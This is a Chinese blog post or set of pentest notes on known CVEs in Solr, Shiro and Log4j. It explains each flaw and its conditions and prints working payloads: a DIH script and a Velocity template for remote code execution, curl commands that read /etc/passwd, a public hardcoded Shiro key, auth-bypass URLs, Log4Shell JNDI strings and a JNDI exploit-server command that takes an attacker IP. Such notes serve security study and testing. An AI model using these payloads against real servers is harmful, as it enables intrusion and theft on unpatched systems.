---
title: "Java组件安全：Solr、Shiro、Log4j"
pubDate: 2026-08-05
tags:
  - 安全
  - Java
---

Java 开发组件层面的漏洞，和中间件、框架又不一样——中间件是装好的服务，框架是写代码的架，组件是拿来即用的库（搜索、认证、日志）。这类漏洞的共同点：组件本身有历史 CVE，加上默认无认证/硬编码密钥/解析特性被滥用，就能从访问接口升级到 RCE。排查思路：识别组件指纹→查版本对应 CVE→看认证和配置→工具一把梭

## Solr CVE-2019-0193（DIH 脚本 RCE）

DataImportHandler 模块允许 `dataConfig` 参数传自定义配置，里面能嵌 JavaScript，没沙箱隔离。版本 <8.2.0，条件：开了 DIH 模块 + Admin UI 无认证

payload（插到 DIH 配置框，`script` 里 exec 命令，entity 的 url 指一个能访问到的 XML）：

```xml
<dataConfig>
<dataSource type="URLDataSource"/>
<script><![CDATA[
function poc(){ java.lang.Runtime.getRuntime().exec("命令"); }
]]></script>
<document>
<entity name="x" url="http://能访问的/x.xml" processor="XPathEntityProcessor" forEach="/feed" transformer="script:poc"/>
</document>
</dataConfig>
```

entity 的 url 默认指向 stackoverflow 国外地址，国内 docker 访问不到，换成国内能访问的 XML 或本地起服务

## Solr CVE-2019-17558（Velocity 模板 RCE）

Config API 能动态启用 `params.resource.loader.enabled`，然后通过 URL 参数传任意 Velocity 模板代码。条件：能访问 Config API + 无认证 + 知道 core 名

先 POST 开启 Velocity：

```json
{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}
```

GET 注入模板（反射 Runtime exec）：

```
/solr/{core}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))...
```

## Solr CVE-2021-27905（enableRemoteStreaming 文件读取/SSRF）

先开 enableRemoteStreaming，再用 debug/dump 的 stream.url 读文件。无认证 + 知道 core 名

```
curl -X POST -H 'Content-Type: application/json' --data-binary '{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' 'http://目标:8983/solr/{core}/config'
curl 'http://目标:8983/solr/{core}/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```

## Solr CVE-2025-24814（JAR 替换 RCE）

无认证时攻击者能替换可信配置文件，通过 `solrconfig.xml` 的 `<lib>` 引入未授权 JAR。独立/用户管理模式 + 未启用认证授权

## Shiro CVE-2016-4437 / Shiro-550（硬编码 key 反序列化 RCE）

≤1.2.4 默认把"记住我"序列化后用硬编码 AES 密钥加密进 Cookie。拿到密钥就能塞恶意序列化数据进 rememberMe，服务端解密触发反序列化。登录页开 rememberMe + 有 gadget 链（CommonsBeanutils/CC3/4/C3P0/Groovy）+ 默认或泄露密钥（kPH+bIxk5D2deZiIxcaaaA== 等 30+ 公开 key）

识别：响应头 `Set-Cookie: rememberMe=deleteMe`。实战基本碰不到，碰到了可能是蜜罐。Shiro 反序列化综合利用工具

## Shiro CVE-2019-12422 / Shiro-721（Padding Oracle）

1.2.5~1.4.1 用 AES-128-CBC 加密 rememberMe，CBC 填充错误返回不同响应。拿一个合法 Cookie，Padding Oracle 逐字节猜解，重新加密任意序列化数据。开 rememberMe + 有合法账号 + 有 gadget + 能发大量请求

## Shiro CVE-2020-11989（二次 URL 解码绕过认证）

`getPathWithinApplication()` 对 URI 两次 URL 解码，Spring Boot 只一次，造成鉴权绕过。Spring Boot + Shiro 鉴权 + Ant 单星规则（`/admin/*`）+ `@PathVariable String`

```
访问 /admin/%20 直接进后台
```

## Shiro CVE-2020-1957（分号截断绕过）

Shiro 先截分号后段再鉴权，Spring 先 normalize 再路由，`/xxx/..;/admin/index` 绕 `/admin/*`。Ant `/admin/*` 拦截 + Spring MVC 分发 + 接受分号 URL

## Shiro CVE-2022-32532（RegEx 换行绕过）

用 RegExPatternMatcher 且正则含 `.`，路径插 `%0a` 让正则匹配失败绕认证。显式用 RegExPatternMatcher + 正则有 `.` + 未开 DOTALL。依赖代码写法，风险低

## Log4j CVE-2021-44228 / Log4Shell（JNDI RCE）

≤2.14.1 打日志时对 `${jndi:ldap://...}` 递归解析，把恶意字符串写进任何能被记录的位置（HTTP 头、参数、Cookie、XFF、UA）就触发 JNDI 远程加载执行。版本 2.0-beta9~2.14.1（含 SpringBoot ≤2.3.x 默认自带），用 log4j-core + Lookup 没关 + 能控制一条日志 + 能出网

黑盒盲打特征 `${jndi:rmi:///xxx}`，用 JNDI-Injection-Exploit 生成地址一个个 URL 编码塞进去试

## Log4j CVE-2021-45046（44228 补丁绕过）

2.15.0 只堵了 `${jndi:` 前缀，`${jndi:${lower:l}${upper:d}${lower:a}${upper:p}://...}` 嵌套大小写绕过继续 RCE/DoS。

## Log4j CVE-2023-26464（JDBCAppender SQL 注入）

2.0~2.20.0 用 JDBCAppender + PatternLayout 拼 `%m` 进 SQL，把 `${jndi:...}` 或恶意 SQL 写进日志触发 JNDI 注入/RCE。JDBCAppender + 拼接用户消息 + 驱动支持多语句

- Solr：https://github.com/xiangmou123/SolrScan （`python run.py`，别带路径；扫不出来看 exp 写法，很多 PoC 的 fetchindex 读不了文件要改 debug/dump）
- Shiro：狐狸工具箱 Pyke-Shiro / Shiro 反序列化综合利用工具
- Log4j：JNDI-Injection-Exploit（`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "命令" -A 攻击机IP`）

组件漏洞两条判断：一是组件本身有没有历史 CVE（查版本），二是当前配置有没有踩雷（默认无认证、硬编码密钥、Lookup 开启、DIH 启用）。有 Key 无链（Shiro 密钥对但没 gadget）时试 Java 自带链或非常规链
